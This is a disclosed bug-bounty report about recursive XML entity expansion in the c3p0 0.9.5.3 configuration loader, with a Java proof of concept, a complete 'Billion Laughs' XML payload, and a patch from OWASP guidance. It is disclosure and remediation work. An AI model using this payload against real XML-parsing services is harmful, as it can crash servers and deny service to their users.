@@ -1,0 +1,102 @@
+ReportLink:https://hackerone.com/reports/509315
+WeaknessName:XML Entity Expansion
+Reporter:https://hackerone.com/amassey
+ReportedTo:Central Security Project(central-security-project)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:16.04.2019 20:05:48
+
+Summary:
+
+> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!  Please refer to the **[example on our policy page](/central-security-project?view_policy=true#disclosure-example)**.
+
+# Maven artifact
+**groupId:** com.mchange
+**artifactId:** c3p0
+**version:** 0.9.5.3
+
+# Vulnerability
+## Vulnerability Description
+> `c3p0/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` does not protect against recursive entity expansion when loading configuration. 
+
+## Additional Details
+**Source File and Line Number:** https://github.com/swaldman/c3p0/blob/c3p0-0.9.5.3/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java#L154
+
+## Steps To Reproduce:
+> Detailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.
+
+1) Use `C3P0ConfigXmlUtils.extractXmlConfigFromInputStream()` on Billion Laughs XML payload
+2) Have a billion laughs while the JVM crashes.
+
+```
+import com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils;
+import java.io.InputStream;
+
+public class C3P0PoC {
+
+    public static void main(String[] args) throws Exception {
+
+        String payload = args[0];
+        InputStream inputStream = C3P0PoC.class.getResourceAsStream(payload);
+
+        C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(inputStream, false);
+
+
+        System.out.println("Completed!");
+    }
+}
+```
+
+XML Payload
+```
+<?xml version="1.0"?>
+<!DOCTYPE lolz [
+        <!ENTITY lol "lol">
+        <!ELEMENT lolz (#PCDATA)>
+        <!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+        <!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">
+        <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+        <!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;">
+        <!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;">
+        <!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">
+        <!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;">
+        <!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;">
+        <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+        ]>
+<lolz>&lol9;</lolz>
+```
+
+## Patch
+
+The patch given was adapted from [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j)
+
+Apply the following before calling `fact.newDocumentBuilder()`.
+```
+String FEATURE = null;
+FEATURE = "http://apache.org/xml/features/disallow-doctype-decl";
+fact.setFeature(FEATURE, true);
+```
+
+## Supporting Material/References:
+> State all technical information about the stack where the vulnerability was found
+- Darwin Kernel Version 18.2.0
+- 1.8.0_171
+- 3.3.9
+
+# Wrap up
+> Select Y or N for the following statements:
+- I contacted the maintainer to let them know: N 
+- I opened an issue in the related repository: N
+
+> Finder's comments and funny memes goes here
+
+Honestly, this is a pretty complicated attack to pull off. The attack requires poisoned XML configuration data to make to the component's client code. I may have held off on reporting it, but the maintainer did acknowledge a similar attack, twas XXE, under CVE-2018-20433. Since the reporter didn't dispute it, I decided to report this attack as valid as well.
+
+Vulnerabilities like these exist because https://docs.oracle.com/javase/7/docs/api/javax/xml/parsers/DocumentBuilderFactory.html#setExpandEntityReferences(boolean) is a poorly named and documented method thus causing misunderstanding.
+
+I'm on my third five hour energy today.
+
+## Impact
+
+This could be leveraged by an attacker to cause a Denial of Service by crashing the JVM that the server process is running on.
